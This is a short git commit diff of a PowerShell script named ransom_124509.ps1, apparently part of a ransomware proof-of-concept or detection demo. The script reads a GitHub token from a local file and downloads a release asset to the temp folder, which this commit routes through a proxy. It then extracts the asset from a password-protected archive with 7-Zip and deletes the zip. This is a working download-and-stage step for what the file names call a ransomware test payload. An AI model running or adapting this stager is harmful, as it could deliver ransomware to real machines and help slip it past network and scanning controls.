04456b045cd8f03bd60201864f5e40d4f7373bca
tameval <114147355+tameval@users.noreply.github.com>
2022-10-23 23:38:38 +0900

    Update ransom_124509.ps1

--- 124509/proxy/ransom_124509.ps1
+++ 124509/proxy/ransom_124509.ps1
@@ -1,4 +1,4 @@
-$tkn= Get-Content "C:\CRDemo\tkn.txt"; $proxy_url= Get-Content "C:\CRDemo\proxy.txt"; $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}; Invoke-WebRequest "https://api.github.com/repos/tameval/poc124509/releases/assets/81659605" -Headers $headers -OutFile $env:TEMP\ransom_test.zip
+$tkn= Get-Content "C:\CRDemo\tkn.txt"; $proxy_url= Get-Content "C:\CRDemo\proxy.txt"; $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}; Invoke-WebRequest "https://api.github.com/repos/tameval/poc124509/releases/assets/81659605" -Proxy $proxy_url -Headers $headers -OutFile $env:TEMP\ransom_test.zip
 cmd.exe /c '"C:\Program Files\7-Zip\7z.exe" e -ppassword123 -o%TEMP% %TEMP%\ransom_test.zip'
 Remove-Item $env:TEMP\ransom_test.zip
 #Remove-Item C:\CRDemo -Force
